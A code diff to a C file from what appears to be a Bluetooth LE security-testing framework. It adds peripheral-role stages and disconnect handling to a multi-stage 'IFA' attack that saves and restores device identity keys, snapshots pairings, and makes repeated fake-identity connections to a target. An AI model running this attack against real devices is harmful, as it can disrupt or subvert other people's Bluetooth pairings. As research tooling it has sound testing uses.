@@ -1,4 +1,5 @@
 #include "ifa.h"
+#include "main.h"
 
 #include <host/keys.h>
 
@@ -9,7 +10,7 @@
 
 static bool snapshot_taken = false;
 static bool id_saved = false;
-const struct shell *ifa_shell;
+//const struct shell *ifa_shell;
 
 uint8_t old_irk[16] = {0};
 bt_addr_le_t old_addr;
@@ -22,7 +23,7 @@ void bt_rpa_invalidate(void);
 
 /* Part 1: internal functions ------------------------------------------------------------------------------------------- */
 void ifa_init(const struct shell *sh){
-  ifa_shell = sh;
+  //ifa_shell = sh;
 }
 
 static int id_reset(uint8_t id, bt_addr_le_t *addr, uint8_t *irk){
@@ -32,7 +33,7 @@ static int id_reset(uint8_t id, bt_addr_le_t *addr, uint8_t *irk){
     // Reseting with new random addr and irk.
     err = bt_id_reset(id, NULL, NULL);
     if(err < 0){
-      shell_error(ifa_shell, "id_reset(): Identity reset failed with code %d", err);
+      shell_error(shell, "id_reset(): Identity reset failed with code %d", err);
       return err;
     }
 
@@ -40,7 +41,7 @@ static int id_reset(uint8_t id, bt_addr_le_t *addr, uint8_t *irk){
     // Reseting with set addr and irk.
     err = bt_id_reset(id, addr, irk);
     if(err < 0){
-      shell_error(ifa_shell, "id_reset(): Identity reset failed with code %d", err);
+      shell_error(shell, "id_reset(): Identity reset failed with code %d", err);
       return err;
     }
   }
@@ -65,18 +66,18 @@ static void get_addr_plus_irk(bt_addr_le_t *addr, uint8_t *log_irk, bool debuggi
     }
     irk_str[16 * 2] = '\0';
 
-    shell_print(ifa_shell, "Got addr: %s, and irk 0x%s ", addr_str, irk_str);
+    shell_print(shell, "Got addr: %s, and irk 0x%s ", addr_str, irk_str);
   }
 }
 
 static int ifa_connect(bt_addr_le_t *addr, struct bt_conn **conn){
   uint32_t options = 0;
   int err;
-  struct bt_conn_le_create_param *create_params = BT_CONN_LE_CREATE_PARAM(options, BT_GAP_SCAN_FAST_INTERVAL, BT_GAP_SCAN_FAST_INTERVAL);
+  struct bt_conn_le_create_param *create_params = BT_CONN_LE_CREATE_PARAM(options, BT_GAP_SCAN_FAST_INTERVAL, BT_GAP_SCAN_FAST_WINDOW);
 
   err = bt_conn_le_create(addr, create_params, BT_LE_CONN_PARAM_DEFAULT, conn);
   if (err < 0) {
-    shell_print(ifa_shell, "ifa_connect(): Connection failed (%d)", err);
+    shell_print(shell, "ifa_connect(): Connection failed (%d)", err);
     return -ENOEXEC;
   }
 
@@ -89,7 +90,7 @@ static int ifa_securiy(struct bt_conn *conn){
 
   err = bt_conn_set_security(conn, BT_SECURITY_L2);
   if (err < 0) {
-    shell_error(ifa_shell, "ifa_securiy(): Setting security failed with err: %d", err);
+    shell_error(shell, "ifa_securiy(): Setting security failed with err: %d", err);
     return err;
   }
 
@@ -103,13 +104,11 @@ static int ifa_unpair(uint8_t id, bt_addr_le_t *addr){
 
 	err = bt_unpair(id, addr);
 	if (err) {
-		shell_error(ifa_shell, "ifa_unpair(): Failed to clear pairing (err %d)", err);
+		shell_error(shell, "ifa_unpair(): Failed to clear pairing (err %d)", err);
     return err;
 	}
 
-  k_sem_take(&disconn_sem, K_FOREVER);
   return err;
-
 }
 
 static int ifa_snapshot_take(bt_addr_le_t *addr){
@@ -122,39 +121,125 @@ static int ifa_snapshot_take(bt_addr_le_t *addr){
 
 static void ifa_stage1(bt_addr_le_t target_addr){
   struct bt_conn *conn = NULL;
+  int err;
 
   cmd_ifa_id_save();
 
   ifa_connect(&target_addr, &conn);
   ifa_securiy(conn);
-
   ifa_snapshot_take(&target_addr);
 
+  err = bt_conn_disconnect(conn, BT_HCI_ERR_REMOTE_USER_TERM_CONN);
+  if (err) {
+    shell_error(shell, "Disconnection failed, reason: %d (%s)", err, bt_hci_err_to_str(err));
+  }
+
+  k_sem_take(&disconn_sem, K_FOREVER);
+
   ifa_unpair(BT_ID_DEFAULT, &target_addr);
-  shell_print(ifa_shell, "\nstage 1 complete. \n");
+  bt_conn_unref(conn);
+  conn = NULL;
+
+  shell_print(shell, "\nstage 1 complete. \n");
+}
+
+static void ifa_stage1_periph(void){
+
+  // save ID (BDA and IRK etc. of current peripheral = DK)
+  cmd_ifa_id_save();
+
+  //check if default_conn exists (so if there is a connection between the two devices)
+  if (!default_conn){
+    shell_error(shell, "Connection terminated.");
+  }
+
+  // get BDA of Central
+  const bt_addr_le_t *dst = bt_conn_get_dst(default_conn); // bt_conn_get_dst() returns a const, but ifa_snapshot_take() and ifa_snapshot_take() require a non-const
+
+  // get BDA of Central as string
+  char addr[BT_ADDR_LE_STR_LEN];
+  bt_addr_le_to_str(dst, addr, sizeof(addr));
+
+  bt_addr_le_t central_addr = *dst;   // therefor, we need to make a mutable copy of *dst
+
+  ifa_snapshot_take(&central_addr);
+
+  int err = bt_conn_disconnect(default_conn, BT_HCI_ERR_REMOTE_USER_TERM_CONN);
+  if (err) {
+    shell_error(shell, "Disconnection failed (err %d)", err);
+  }
+
+  k_sem_take(&disconn_sem, K_FOREVER);
+
+  ifa_unpair(BT_ID_DEFAULT, &central_addr);
+  shell_print(shell, "\nstage 1 with %s complete. \n", addr);
 }
 
 static void ifa_stage2(bt_addr_le_t target_addr, int n){
   struct bt_conn *conn = NULL;
+  int err;
 
   for(int i = 0; i < n; i++){
     id_reset(BT_ID_DEFAULT, NULL, NULL);
 
     ifa_connect(&target_addr, &conn);
     if (!conn) {
-        shell_error(ifa_shell, "Failed to establish connection. Skipping iteration.");
-        shell_error(ifa_shell, "This might indicate that the device does not allow multiple connection events in a short time frame. You should consider attempting the attack manually");
-        shell_error(ifa_shell, "To get help with this call bleframework ifa_help");
+        shell_error(shell, "Failed to establish connection. Skipping iteration.");
+        shell_error(shell, "This might indicate that the device does not allow multiple connection events in a short time frame. You should consider attempting the attack manually");
+        shell_error(shell, "To get help with this call bleframework ifa_help");
         continue;
     }
 
     ifa_securiy(conn);
-    ifa_unpair(BT_ID_DEFAULT, &target_addr);
 
+    err = bt_conn_disconnect(conn, BT_HCI_ERR_REMOTE_USER_TERM_CONN);
+    if (err) {
+      shell_error(shell, "Disconnection failed, reason: %d (%s)", err, bt_hci_err_to_str(err));
+    }
+
+    k_sem_take(&disconn_sem, K_FOREVER);
+
+    ifa_unpair(BT_ID_DEFAULT, &target_addr);
+    bt_conn_unref(conn);
     conn = NULL;
-    shell_print(ifa_shell, "fake id connection event: %d completed\n", (i+1));
+
+    shell_print(shell, "fake id connection event: %d completed\n", (i+1));
   }
-  shell_print(ifa_shell, "stage 2 complete. \n");
+  shell_print(shell, "stage 2 complete. \n");
+}
+
+static void ifa_stage2_1_periph(void){
+    id_reset(BT_ID_DEFAULT, NULL, NULL);
+    shell_print(shell, "stage 2.1 completed. \n");
+
+    w_advertising_start();
+}
+
+static void ifa_stage2_2_periph(void){
+
+    //check if default_conn exists (so if there is a connection between the two devices)
+    if (!default_conn){
+      shell_error(shell, "Connection terminated.");
+    }
+
+    const bt_addr_le_t *dst = bt_conn_get_dst(default_conn); // bt_conn_get_dst() returns a const, but ifa_snapshot_take() and ifa_snapshot_take() require a non-const
+
+    // get BDA of Central as string
+    char addr[BT_ADDR_LE_STR_LEN];
+    bt_addr_le_to_str(dst, addr, sizeof(addr));
+
+    bt_addr_le_t central_addr = *dst;   // therefor, we need to make a mutable copy of *dst
+
+    int err = bt_conn_disconnect(default_conn, BT_HCI_ERR_REMOTE_USER_TERM_CONN);
+    if (err) {
+      shell_error(shell, "Disconnection failed (err %d)", err);
+    }
+
+    k_sem_take(&disconn_sem, K_FOREVER);
+
+    ifa_unpair(BT_ID_DEFAULT, &central_addr);
+
+    shell_print(shell, "\nstage 2.2 with %s complete. \n", addr);
 }
 
 static void ifa_stage3(void){
@@ -168,25 +253,25 @@ static void ifa_stage3(void){
 
 	err = bt_disable();
 	if (err) {
-		printf("Bluetooth disable failed (err %d)\n", err);
+		shell_error(shell, "Bluetooth disable failed (err %d)\n", err);
 	}
-	printf("Bluetooth disabled\n");
+	shell_print(shell, "Bluetooth disabled\n");
 
 	err = bt_enable(NULL);
 	if (err) {
-		printf("Bluetooth init failed (err %d)\n", err);
+		shell_error(shell, "Bluetooth init failed (err %d)\n", err);
 	}
-	printf("Bluetooth re-enabled\n");
+	shell_print(shell,"Bluetooth re-enabled\n");
 
 	err = settings_load();
   if(err < 0){
-    printf("Loading settings failed with err: %d\n", err);
-    printf("continuing anyways\n");
+    shell_error(shell, "Loading settings failed with err: %d\n", err);
+    shell_print(shell, "continuing anyways\n");
   } else {
-	printf("Settings loaded\n");
+	  shell_print(shell,"Settings loaded\n");
   }
 
-  shell_print(ifa_shell, "\nstage 3 complete. \n");
+  shell_print(shell, "\nstage 3 complete. \n");
 }
 
 static void ifa_stage4(bt_addr_le_t target_addr){
@@ -195,7 +280,7 @@ static void ifa_stage4(bt_addr_le_t target_addr){
   ifa_connect(&target_addr, &conn);
   ifa_securiy(conn);
 
-  shell_print(ifa_shell, "\nstage 4 complete. \n");
+  shell_print(shell, "\nstage 4 complete. \n");
 }
 
 
@@ -210,7 +295,7 @@ int cmd_reset(const struct shell *sh, size_t argc, char *argv[]){
 }
 
 int cmd_ifa_id_save(){
-  shell_print(ifa_shell, "saving address");
+  shell_print(shell, "saving address");
   get_addr_plus_irk(&old_addr, old_irk, false);
 
   id_saved = true;
@@ -220,11 +305,11 @@ int cmd_ifa_id_save(){
 int cmd_ifa_id_restore(){
   if(id_saved) {
     id_reset(BT_ID_DEFAULT, &old_addr, old_irk);
-    shell_print(ifa_shell, "id reset to old values");
+    shell_print(shell, "id reset to old values");
     return 0;
   }
 
-  shell_error(ifa_shell, "id_restore no id to restore");
+  shell_error(shell, "id_restore no id to restore");
   return  -1;
 }
 
@@ -249,7 +334,7 @@ int cmd_ifa_snapshot_restore(){
     return 0;
   }
 
-  shell_error(ifa_shell, "snapshot_restore() no snapshot to restore");
+  shell_error(shell, "snapshot_restore() no snapshot to restore");
   return  -1;
 }
 
@@ -264,6 +349,13 @@ int cmd_ifa_stage1(const struct shell *sh, size_t argc, char *argv[]){
   }
 
   ifa_stage1(target_addr);
+
+  return 0;
+}
+
+int cmd_ifa_stage1_periph(const struct shell *sh){
+
+  ifa_stage1_periph();
 
   return 0;
 }
@@ -286,6 +378,20 @@ int cmd_ifa_stage2(const struct shell *sh, size_t argc, char *argv[]){
   }
 
   ifa_stage2(target_addr, n);
+
+  return 0;
+}
+
+int cmd_ifa_stage2_1_periph(const struct shell *sh){
+
+  ifa_stage2_1_periph();
+
+  return 0;
+}
+
+int cmd_ifa_stage2_2_periph(const struct shell *sh){
+
+  ifa_stage2_2_periph();
 
   return 0;
 }
